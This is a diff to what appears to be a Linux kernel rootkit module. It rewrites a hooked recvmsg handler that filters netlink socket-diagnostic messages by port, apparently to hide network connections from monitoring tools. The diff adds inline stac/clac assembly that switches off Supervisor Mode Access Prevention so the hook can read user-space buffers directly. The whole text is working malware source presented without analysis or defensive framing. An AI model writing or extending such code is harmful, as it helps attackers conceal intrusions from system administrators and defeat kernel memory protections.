@@ -161,6 +161,18 @@ remove_port_from_list(port_list_t_ptr list, port_t port, proto proto)
     return ret;
 }
 
+// https://wiki.osdev.org/Supervisor_Memory_Protection
+static inline void cpu_flags_set_ac(void) {
+    // Set AC bit in RFLAGS register.
+    __asm__ volatile ("stac" ::: "cc");
+}
+
+// https://wiki.osdev.org/Supervisor_Memory_Protection
+static inline void cpu_flags_clear_ac(void) {
+    // Clear AC bit in RFLAGS register.
+    __asm__ volatile ("clac" ::: "cc");
+}
+
 asmlinkage ssize_t
 g7_recvmsg(struct pt_regs *pt_regs)
 {
@@ -171,15 +183,9 @@ g7_recvmsg(struct pt_regs *pt_regs)
     if ((len = ret = sys_recvmsg(pt_regs)) < 0)
         return ret;
 
-    int bytes = 0;
-    while (access_ok(nh + bytes, 1))
-        ++bytes;
+    cpu_flags_set_ac();
 
-    nh = (struct nlmsghdr *)kvmalloc(bytes, GFP_KERNEL);
-
-    copy_from_user(nh,
-        (struct nlmsghdr *)((struct user_msghdr *)pt_regs->si)->msg_iov->iov_base,
-        bytes);
+    nh = (struct nlmsghdr *)((struct user_msghdr *)pt_regs->si)->msg_iov->iov_base;
 
     while (nh && NLMSG_OK(nh, len)) {
         int src = ntohs(((struct inet_diag_msg *)NLMSG_DATA(nh))->id.idiag_sport);
@@ -197,7 +203,8 @@ g7_recvmsg(struct pt_regs *pt_regs)
             nh = NLMSG_NEXT(nh, len);
     }
 
-    kfree(nh);
+    cpu_flags_clear_ac();
+
     return ret;
 }
 
